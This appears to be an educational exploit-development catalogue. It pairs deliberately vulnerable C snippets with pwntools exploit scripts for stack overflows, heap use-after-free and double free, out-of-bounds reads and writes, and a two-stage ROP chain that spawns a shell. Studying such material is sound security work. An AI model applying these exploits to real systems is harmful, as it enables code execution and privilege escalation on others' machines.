04Research

Each entry contains the vulnerable C pattern and a working pwntools exploit. All content is for educational and research purposes.

STACKBuffer OverflowC · x86_64▼
Writing past the end of a fixed-size stack buffer overwrites adjacent memory — including the saved return address. Controlling RIP gives an attacker code execution.
// gcc -o bof bof.c -fno-stack-protector -no-pie #include <stdio.h> void win() { puts("shell!"); } void vuln() { char buf[64]; gets(buf); // BUG: no length check // buf[72..79] = saved RIP ← attacker controls } int main() { vuln(); }
CRITICAL
x86_64 · no-pie · no canary · NX off
Overflow the 64-byte buffer, pad to saved RIP at offset 72, overwrite with the address of win().
#!/usr/bin/env python3 from pwn import * elf = ELF('./bof', checksec=False) p = process('./bof') WIN = elf.sym['win'] OFFSET = 72 # 64-byte buf + 8-byte saved RBP payload = b'A' * OFFSET payload += p64(WIN) p.sendline(payload) p.interactive()
HEAPUse-After-Free (UAF)C · glibc▼
A pointer is used after its memory has been freed. If an attacker reclaims that chunk with controlled data before the stale pointer is dereferenced, they control reads or function calls.
typedef struct { char name[32]; void(*greet)(); } User; void hello() { puts("hello!"); } void backdoor() { system("/bin/sh"); } int main() { User *u = malloc(sizeof(User)); u->greet = hello; free(u); // chunk → tcache char *evil = malloc(sizeof(User)); *(void(**)()){evil+32} = backdoor; u->greet(); // BUG: stale ptr → calls backdoor() }
CRITICAL
x86_64 · glibc tcache · no PIE · NX enabled
Free the User chunk, reclaim it with controlled data overwriting the function pointer at offset 32, then trigger the call through the stale pointer.
#!/usr/bin/env python3 from pwn import * elf = ELF('./uaf_target', checksec=False) p = process('./uaf_target') BACKDOOR = elf.sym['backdoor'] FNPTR_OFF = 32 def alloc(name): p.sendlineafter(b'> ', b'1'); p.sendlineafter(b'name: ', name) def free_user(): p.sendlineafter(b'> ', b'2') def call_greet(): p.sendlineafter(b'> ', b'3') alloc(b'legit') free_user() fake = b'B' * FNPTR_OFF + p64(BACKDOOR) alloc(fake) call_greet() p.interactive()
HEAPDouble FreeC · glibc tcache▼
Freeing the same pointer twice corrupts the tcache free-list into a loop. Poisoning the fd pointer redirects the next malloc() to an arbitrary address — arbitrary write primitive.
int main() { void *a = malloc(0x28); void *b = malloc(0x28); free(a); free(b); free(a); // BUG: double free → tcache: a→b→a void *c = malloc(0x28); // returns a void *d = malloc(0x28); // returns b *(void**)c = (void*)0xdeadbeef; void *e = malloc(0x28); void *f = malloc(0x28); // → 0xdeadbeef }
CRITICAL
x86_64 · glibc 2.31 · tcache · no PIE
Double-free to create a tcache loop, poison the fd pointer to target __free_hook, write system() there, then free a chunk containing "/bin/sh".
#!/usr/bin/env python3 from pwn import * elf = ELF('./dfree', checksec=False) libc = ELF('./libc-2.31.so', checksec=False) p = process('./dfree') # (obtain libc base from a prior puts() leak) free_hook = libc.sym['__free_hook'] system = libc.sym['system'] def alloc(data): p.sendlineafter(b'> ', b'1'); p.sendlineafter(b': ', data) def free(idx): p.sendlineafter(b'> ', b'2'); p.sendlineafter(b': ', str(idx).encode()) def write(idx, data): p.sendlineafter(b'> ', b'3'); p.sendlineafter(b': ', str(idx).encode()); p.sendlineafter(b': ', data) alloc(b'A'*0x28); alloc(b'B'*0x28) free(0); free(1); free(0) # double free write(0, p64(free_hook)) # poison fd → __free_hook alloc(b'C'*0x28); alloc(b'D'*0x28) alloc(p64(system)) # write system() to __free_hook alloc(b'/bin/sh\x00') free(5) # free("/bin/sh") → system("/bin/sh") p.interactive()
MEMORYMemory LeakC · heap▼
Allocated memory never freed accumulates over time, exhausting the process heap. In privileged long-running processes stale buffers may also expose sensitive data.
char *get_token(const char *in) { char *buf = malloc(256); // new alloc every call snprintf(buf, 256, "TOKEN:%s", in); return buf; } int main() { for (int i=0; i<1000000; i++) { char *t = get_token("session"); printf("%s\n", t); // BUG: t never freed — 256 B per iteration } }
MEDIUM
DoS · heap exhaustion · stale data disclosure
Flood the allocator to exhaust heap (DoS) and observe stale malloc() data leaking sensitive content from prior allocations.
#!/usr/bin/env python3 # Detect with: valgrind --leak-check=full ./memleak from pwn import * p = process('./memleak_server') for i in range(500000): p.sendlineafter(b'> ', b'alloc') line = p.recvline() if b'SECRET' in line or b'KEY' in line: log.success(f'Stale data at iter {i}: {line}') break p.interactive()
MEMORYOut-of-Bounds ReadC · info leak▼
Reading beyond a buffer leaks adjacent memory — stack canaries, pointers, ASLR offsets, or cryptographic keys. Classic stage-1 primitive used before a write-based follow-up.
void echo(uint8_t *data, size_t claimed_len) { uint8_t secret[8] = {0xde,0xad,0xbe,0xef,0xca,0xfe,0xba,0xbe}; uint8_t buf[16]; memcpy(buf, data, 4); // BUG: claimed_len > 16 reads secret[] and beyond for (size_t i=0; i<claimed_len; i++) printf("%02x ", buf[i]); // OOB when i >= 16 }
HIGH
x86_64 · ASLR bypass primitive · canary leak
Send 4 real bytes but claim 256. The server echoes 256 bytes from the stack — leaking the canary, saved RBP, saved RIP, and libc addresses needed for a full exploit.
#!/usr/bin/env python3 from pwn import * p = remote('ctf.target.com', 1337) p.sendlineafter(b'len: ', b'256') p.sendlineafter(b'data: ', b'\x48\x49\x00\x00') leak_bytes = bytes(int(x,16) for x in p.recvline().split()) log.info(f'Leak ({len(leak_bytes)}B): {leak_bytes.hex()}') # Stack offsets (adjust per target): canary = u64(leak_bytes[24:32]) saved_rip = u64(leak_bytes[40:48]) log.success(f'canary = {hex(canary)}') log.success(f'saved_rip = {hex(saved_rip)}')
STACKOut-of-Bounds WriteC · stack/heap▼
Writing beyond a buffer corrupts adjacent memory — canary or RIP on stack, metadata or objects on heap. Classic BSS variable overwrite when adjacent globals are in scope.
int authenticated = 0; // BSS — adjacent to buf void login(const char *username) { char buf[8]; strcpy(buf, username); // BUG: no length limit } int main() { login("AAAAAAAAAAAAAAAA"); if (authenticated) puts("access granted"); }
HIGH
x86_64 · BSS overwrite · no canary
Overflow the 8-byte buffer to overwrite the adjacent authenticated integer. A non-zero value bypasses the check without valid credentials.
#!/usr/bin/env python3 from pwn import * p = process('./oob_write') OFFSET = 8 # buf[8], authenticated immediately follows payload = b'A' * OFFSET payload += p32(1) # authenticated = 1 p.sendlineafter(b'username: ', payload) p.interactive() # expect: "access granted"
HEAPDangling PointerC · heap▼
A pointer that still holds the address of freed memory. Any future allocation can reclaim that region, making later dereferences controlled by an attacker.
typedef struct { int id; int priv_level; } Session; Session *active; void logout() { free(active); // BUG: active not set to NULL — dangling pointer } void check_admin() { if (active && active->priv_level > 0) // dangling deref puts("admin access"); }
HIGH
x86_64 · glibc tcache · privilege escalation
Log out to free the Session chunk, then allocate a same-size buffer with priv_level set non-zero. The dangling active pointer reads our controlled data when check_admin() runs.
#!/usr/bin/env python3 from pwn import * p = process('./dangling') def login(): p.sendlineafter(b'> ', b'1') def logout(): p.sendlineafter(b'> ', b'2') def alloc_buf(data): p.sendlineafter(b'> ', b'3'); p.sendlineafter(b'data: ', data) def check(): p.sendlineafter(b'> ', b'4') login() logout() # frees Session, leaves dangling ptr # Reclaim 8-byte chunk: { id=1337, priv_level=9999 } alloc_buf(p32(1337) + p32(9999)) check() # active->priv_level = 9999 → admin access p.interactive()
MEMORYUninitialized Memory UsageC · stack/heap▼
Reading a variable before assignment uses whatever bytes happen to be in memory. Attackers who control prior allocations can influence these values to bypass checks or leak information.
int check_license(int input) { int valid; // BUG: uninitialised — stack garbage if (input == 0xc0ffee) valid = 1; return valid; // stale stack data if wrong input } void heap_leak() { char *buf = malloc(64); // no zero-init puts(buf); // prints stale heap data free(buf); }
MEDIUM
x86_64 · stack spray · heap info-leak
Spray a known value onto the stack so the uninitialised variable picks it up. Separately, observe stale heap data leaking from prior allocations through the uncleared malloc() return.
#!/usr/bin/env python3 from pwn import * p = process('./uninit') def spray(): p.sendlineafter(b'> ', b'spray') def check(): p.sendlineafter(b'> ', b'check'); p.sendlineafter(b'input: ', b'0'); return p.recvline() def alloc_secret(): p.sendlineafter(b'> ', b'secret') def leak(): p.sendlineafter(b'> ', b'leak') # Stack spray: prime the stack with value 1 at `valid`s location spray() result = check() # input=0 skips assignment; reads sprayed 1 if b'licensed' in result: log.success('Uninit stack var exploited') # Heap leak: write sensitive data, free, reallocate, print stale contents alloc_secret() leak() # malloc(64) reclaims → stale SECRET_KEY printed p.interactive()
ROPReturn-Oriented Programmingx86_64 · NX + ASLR bypass▼
When NX/DEP prevents executing shellcode, ROP chains together small existing code sequences ("gadgets") each ending in ret, giving Turing-complete execution without writing a single new byte of code.
// gcc -o rop_target rop_target.c -no-pie -fno-stack-protector void vuln() { char buf[64]; read(0, buf, 256); // BUG: 256 into 64-byte buf } int main() { vuln(); } /* Stack after overflow: * ┌─────────────────────────────────┐ * │ 'A' × 72 (padding) │ * │ pop rdi ; ret │ gadget 1 * │ &"/bin/sh" in libc │ rdi = "/bin/sh" * │ ret │ gadget 2 (stack align) * │ &system() in libc │ system("/bin/sh") * └─────────────────────────────────┘ * $ ROPgadget --binary ./rop_target | grep "pop rdi" * (pwndbg) rop --grep "pop rdi" */
CRITICAL
x86_64 · NX + ASLR · PIE off · no canary
Two-stage exploit. Stage 1 leaks puts() from GOT to defeat ASLR. Stage 2 builds pop rdi → /bin/sh → system() with a ret gadget for glibc 2.35+ stack alignment.
#!/usr/bin/env python3 from pwn import * elf = ELF('./rop_target', checksec=False) libc = ELF('./libc-2.35.so', checksec=False) ld = ELF('./ld-2.35.so', checksec=False) context.binary = elf; context.log_level = 'info' def conn(): if args.REMOTE: return remote('ctf.example.com', 1337) return process([ld.path, elf.path], env={'LD_PRELOAD': libc.path}) p = conn() pop_rdi = 0x00000000004013d3 # pop rdi ; ret ret_gadg = 0x000000000040101a # ret (stack alignment) OFFSET = 72 # Stage 1 — leak puts() to break ASLR payload = b'A' * OFFSET payload += p64(pop_rdi) + p64(elf.got['puts']) payload += p64(elf.plt['puts']) + p64(elf.sym['main']) p.send(payload) leak = u64(p.recvuntil(b'\n', drop=True).ljust(8, b'\x00')) libc.address = leak - libc.sym['puts'] assert libc.address & 0xfff == 0, 'bad libc base' log.success(f'libc @ {hex(libc.address)}') # Stage 2 — system("/bin/sh") bin_sh = next(libc.search(b'/bin/sh\x00')) system = libc.sym['system'] payload2 = b'A' * OFFSET payload2 += p64(ret_gadg) + p64(pop_rdi) + p64(bin_sh) + p64(system) p.send(payload2) p.interactive()
